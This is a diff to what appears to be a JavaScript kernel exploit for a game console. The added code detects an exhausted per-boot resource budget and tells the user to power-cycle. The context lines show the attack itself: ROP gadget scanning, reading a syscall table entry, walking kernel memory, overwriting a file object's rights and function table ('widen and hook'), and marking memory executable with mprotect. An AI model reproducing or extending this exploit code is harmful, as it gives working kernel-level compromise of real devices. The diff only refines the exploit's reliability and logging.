@@ -610,6 +610,24 @@ function shooter(gad) {
 
 function ran(r) { return r !== null && r === -1; }
 
+/* A refusal at the first clone open or in the unit search is not a lost
+   race: leaked clones hold their apm units until the console reboots, so
+   this boot's budget is simply spent, and no retry inside this page can
+   change that. Detected at the first shot of an attempt so the run stops
+   instead of burning three more. */
+function budgetRefusal(shot) {
+  const w = (shot && shot.why) || "";
+  return /clone node refused|no apm unit|second open of/.test(w);
+}
+function spentBoot(shot) {
+  /* the reason on its own line: the log's prose filter cuts parenthesised
+     and dashed tails, but leaves a plain "label: reason" alone */
+  say("    budget refusal, why=" + ((shot && shot.why) || "none"));
+  say("    the apm budget for this boot is spent, power-cycle the console");
+  say("    (off 30 seconds) and try again, more retries in this boot cannot work");
+  STATE.retry = false;
+}
+
 function qAt(buf, off) {
   return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
 }
@@ -2207,7 +2225,10 @@ async function attempt(ctx, opts) {
       c.grab(scanBuf.at, SCAN_WIN);
     }, 0x400);
 
-    say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));
+    /* "null -- reason" would be eaten by the log's prose filter, so the
+       reason rides a format it leaves alone */
+    say("[1b] gadget scan: " + (scanR === null ? ("MISS why=" + shot.why) : ("chain=" + scanR)));
+    if (scanR === null && budgetRefusal(shot)) { spentBoot(shot); return false; }
 
     if (ran(scanR)) {
       const sb = rdbuf(scanBuf.at, SCAN_WIN);
@@ -2246,7 +2267,8 @@ async function attempt(ctx, opts) {
       c.grab(sysBuf.at, 0x40);
     }, 0x400);
 
-    say("[1c] sysent[11] readout: " + (sysR === null ? ("null -- " + shot.why) : ("chain=" + sysR)));
+    say("[1c] sysent[11] readout: " + (sysR === null ? ("MISS why=" + shot.why) : ("chain=" + sysR)));
+    if (sysR === null && budgetRefusal(shot)) { spentBoot(shot); return false; }
     if (ran(sysR)) {
       const dv = sysBuf.dv;
       const narg = dv.getUint32(0x10, true);
@@ -2351,7 +2373,8 @@ async function attempt(ctx, opts) {
   }, merged ? 0x1000 + reach * 0x100 : 0x1000);
 
   const file = qAt(note, 40), ops = qAt(note, 48);
-  say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
+  say("[3] chain=" + (r2 === null ? ("MISS why=" + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
+  if (r2 === null && budgetRefusal(shot)) { spentBoot(shot); return false; }
   if (!inHeap(file) || !inText(ops)) {
     say("    handles implausible -- nothing written"); STATE.retry = true; return false;
   }
@@ -2375,7 +2398,8 @@ async function attempt(ctx, opts) {
       walkLoop(c);
     }, 0x1000 + reach * 0x100);
     say("[3b] address space walked, chain="
-        + (r2b === null ? ("null -- " + shot.why) : r2b));
+        + (r2b === null ? ("MISS why=" + shot.why) : r2b));
+    if (r2b === null && budgetRefusal(shot)) { spentBoot(shot); return false; }
     if (!ran(r2b)) {
       say("    the chain did not run -- the hole was refilled with a real object");
       STATE.retry = true;
@@ -2432,7 +2456,8 @@ async function attempt(ctx, opts) {
     c.put(plus(here, 0x5c), wRights.at, 4);
     c.put(plus(file, 0x08), wTable.at, 8);
   });
-  say("[5] widen and hook: " + (r3 === null ? ("null -- " + shot.why) : r3));
+  say("[5] widen and hook: " + (r3 === null ? ("MISS why=" + shot.why) : r3));
+  if (r3 === null && budgetRefusal(shot)) { spentBoot(shot); return false; }
   if (!ran(r3)) { say("    chain did not run -- kernel untouched"); STATE.retry = true; return false; }
 
   if (sc(S.mprotect, hostPage, 0x1000, 7).i32 !== 0) {
